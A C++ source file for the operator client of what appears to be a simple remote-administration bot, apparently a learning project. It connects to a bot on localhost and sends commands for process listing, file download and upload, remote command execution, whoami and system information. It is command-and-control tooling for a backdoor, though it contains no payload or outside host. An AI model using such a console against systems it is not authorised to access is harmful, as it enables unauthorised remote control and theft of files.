// Client
// Right click project -> build options -> linker settings -> add "libwsock32"
#define WIN32_LEAN_AND_MEAN

#include "bot.h"
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

#define BUF_SIZE 2000

void print_options(){
    string optList[9] = {"exit",
                "print_options",
                "process_list",
                "dl_file",
                "ul_file",
                "rce",
                "net_info",
                "whoami",
                "sys_info"};

        // Print options
        for (int i=0; i < 9; i++){
            printf("%d - %s\n", i, optList[i].c_str());
        }
}

int main(){
  // Initialize Winsock
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        wprintf(L"WSAStartup function failed with error: %d\n", iResult);
        return 1;
    }
    //----------------------
    // Create a SOCKET for connecting to server
    SOCKET ConnectSocket;
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        wprintf(L"socket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    //----------------------
    // The sockaddr_in structure specifies the address family,
    // IP address, and port of the server to be connected to.
    sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr("127.0.0.1");
    clientService.sin_port = htons(31000);

    //----------------------
    // Connect to server.
    iResult = connect(ConnectSocket, (SOCKADDR *) & clientService, sizeof (clientService));
    if (iResult == SOCKET_ERROR) {
        wprintf(L"connect function failed with error: %ld\n", WSAGetLastError());
        iResult = closesocket(ConnectSocket);
        if (iResult == SOCKET_ERROR)
            wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Begin talking with Server here.
    char recvBuffer[BUF_SIZE];
    char sendBuffer[BUF_SIZE];
    int errCode = 0;
    string userInput;

    wprintf(L"Connected to server.\n");
    printf("Accepting data from server\n");
    print_options();
    do {
        printf("\nEnter a command to execute: ");
        memset(&sendBuffer, 0, sizeof(sendBuffer));
        getline(cin, userInput);
        if (strcmp(userInput.c_str(), "1") == 0){
            print_options();
            continue;
        }
        strcat(sendBuffer, userInput.c_str());
        send_data(ConnectSocket, sendBuffer);
        int option = atoi(userInput.c_str());
        switch(atoi(userInput.c_str())){
            case 3: // fallthrough
            case 4:
                printf("Enter the filename: ");
                getline(cin,userInput);
                memset(&sendBuffer, 0, sizeof(sendBuffer));
                strcat(sendBuffer, userInput.c_str());
                send_data(ConnectSocket, sendBuffer);
                break;
            case 5:
                printf("Enter command: ");
                getline(cin,userInput);
                memset(&sendBuffer, 0, sizeof(sendBuffer));
                strcat(sendBuffer, userInput.c_str());
                send_data(ConnectSocket, sendBuffer);
                break;
        }

        // Receive function option from user
        do{
            memset(&recvBuffer, 0, sizeof(recvBuffer));
            errCode = recv(ConnectSocket, recvBuffer, BUF_SIZE, 0);
            if (errCode > 0){
                printf("Data received: %s\n", recvBuffer);
            } else if (errCode == 0){
                printf("Connection closed...\n");
            } else {
                printf("Failed to receive data: %d\n", WSAGetLastError());
            }
        } while (strcmp(recvBuffer, "<END>"));

    }while (strcmp(userInput.c_str(),"0") != 0);

    // End connection with Server
    wprintf(L"Closing socket connection.\n");
    iResult = closesocket(ConnectSocket);
    if (iResult == SOCKET_ERROR) {
        wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    WSACleanup();
    return 0;
}
